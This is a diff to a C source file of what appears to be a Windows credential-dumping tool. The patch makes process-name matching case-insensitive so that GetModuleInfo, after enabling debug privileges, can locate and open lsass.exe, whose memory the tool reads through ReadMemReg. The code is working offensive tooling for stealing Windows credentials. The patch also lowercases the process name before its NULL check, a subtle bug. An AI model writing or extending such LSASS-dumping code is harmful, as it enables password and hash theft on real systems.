@@ -291,11 +291,23 @@ char* GetProcNameFromHandle(HANDLE process_handle) {
 }
 
 
+void to_lowercase(char* str) {
+    while (*str) {
+        *str = tolower((unsigned char)*str);  // Convert each character to lowercase
+        str++;
+    }
+}
+
+
 HANDLE GetProcessByName(const char* proc_name) {
     HANDLE aux_handle = NULL;
+
     // Iterate processes
     while (NT_SUCCESS(NtGetNextProcess(aux_handle, MAXIMUM_ALLOWED, 0, 0, &aux_handle))) {
         char* current_proc_name = GetProcNameFromHandle(aux_handle);
+        //printf("aux_handle: %d\n", aux_handle);
+        //printf("[+] current_proc_name: %s\n ", current_proc_name);
+        to_lowercase(current_proc_name);
         if (current_proc_name && strcmp(current_proc_name, proc_name) == 0) {
             return aux_handle;
         }
@@ -395,7 +407,7 @@ MemFile* ReadMemReg(LPVOID hProcess, int* memfile_count_out) {
 
 ModuleInformation* GetModuleInfo(LPVOID* outputHandle, int* module_counter_out) {
     EnableDebugPrivileges();
-    HANDLE hProcess = GetProcessByName("C:\\WINDOWS\\system32\\lsass.exe");
+    HANDLE hProcess = GetProcessByName("c:\\windows\\system32\\lsass.exe");
     *outputHandle = (LPVOID)hProcess;
     printf("[+] Process handle:\t%d\n", hProcess);
 
